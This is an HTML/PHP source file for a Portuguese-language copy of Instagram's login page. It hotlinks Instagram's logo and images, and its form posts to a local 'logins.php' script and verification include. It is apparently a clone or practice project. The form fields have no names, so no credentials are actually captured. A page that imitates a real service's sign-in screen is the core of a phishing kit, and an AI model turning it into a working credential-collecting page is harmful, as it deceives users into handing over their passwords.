<!DOCTYPE php>
<html lang="PT-BR">

<head>
  <meta charset="UTF-8" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Instagram login</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC" crossorigin="anonymous" />
  <link rel="stylesheet" href="assets/css/main.css" />
</head>

<body>
  <main>
    <section id="login" class="feed mt-4">
      <div class="container" style="width: 50%">
        <div class="row">
          <div class="col">
            <img class="foto_login" src="https://www.instagram.com/static/images/homepage/home-phones.png/43cc71bb1b43.png" alt="" />
          </div>
          <div class="col" class="caixa">
            <div class="card" style="width: 348px; height: 400px">
              <img class="foto" src="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png" width="175px" height="51px" alt="Logo do aplicativo Instagrams" />
              <div class="card-body" style="padding-bottom: 0px">
              <form action="logins.php"method="POST">
                <div class="form-floating d-grid gap-2" style="
                      width: 258px;
                      height: 36px;
                      font-size: 12px;
                      margin-bottom: 30px;
                    ">
                  <input type="email" class="form-control" id="floatingInput" placeholder="name@example.com" />
                  <label for="floatingInput">Telefone, nome de usuário ou email</label>
                </div>
                <div class="form-floating d-grid gap-2" style="
                      width: 258px;
                      height: 36px;
                      font-size: 12px;
                      margin-bottom: 30px;
                    ">
                  <input type="password" class="form-control" id="floatingPassword" placeholder="Password" />
                  <label for="floatingPassword">Senha</label>
                </div>
                <div class="d-grid gap-2 botao">
                  <input style="margin-left: 0px" type="submit" class="btn btn-primary" name="submit">
                    Entrar
                    <input/>
                  </button>
                </div>
                <?php include "database/verify_user.php" ?>
              </div>
              <div>
              </form>
                <div class="ou" style="font-size: 14px">
                  <svg class="risco" xmlns="http://www.w3.org/2000/svg" width="110" height="2" fill="currentColor" class="bi bi-dash-lg" viewBox="0 0 16 16">
                    <path fill-rule="evenodd" d="M2 8a.5.5 0 0 1 .5-.5h11a.5.5 0 0 1 0 1h-11A.5.5 0 0 1 2 8Z" />
                  </svg>

                  OU

                  <svg class="risco" xmlns="http://www.w3.org/2000/svg" width="110" height="2" fill="currentColor" class="bi bi-dash-lg" viewBox="0 0 16 16">
                    <path fill-rule="evenodd" d="M2 8a.5.5 0 0 1 .5-.5h11a.5.5 0 0 1 0 1h-11A.5.5 0 0 1 2 8Z" />
                  </svg>
                </div>
              </div>
              <div>
                <div class="foto_face">
                  <svg style="margin-right: 8px" xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-facebook" viewBox="0 0 16 16">
                    <path d="M16 8.049c0-4.446-3.582-8.05-8-8.05C3.58 0-.002 3.603-.002 8.05c0 4.017 2.926 7.347 6.75 7.951v-5.625h-2.03V8.05H6.75V6.275c0-2.017 1.195-3.131 3.022-3.131.876 0 1.791.157 1.791.157v1.98h-1.009c-.993 0-1.303.621-1.303 1.258v1.51h2.218l-.354 2.326H9.25V16c3.824-.604 6.75-3.934 6.75-7.951z" />
                  </svg>
                  <button type="button" class="face btn btn-link">
                    Entrar com o Facebook
                  </button>
                  <div>
                    <button type="button" class="esqueceu btn btn-link">
                      Esqueceu a Senha?
                    </button>
                  </div>
                </div>
                <div></div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </section>
  </main>
  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-ka7Sk0Gln4gmtz2MlQnikT1wXgYsOg+OMhuP+IlRH9sENBO0LRn5q+8nbTov4+1p" crossorigin="anonymous"></script>
</body>

</html>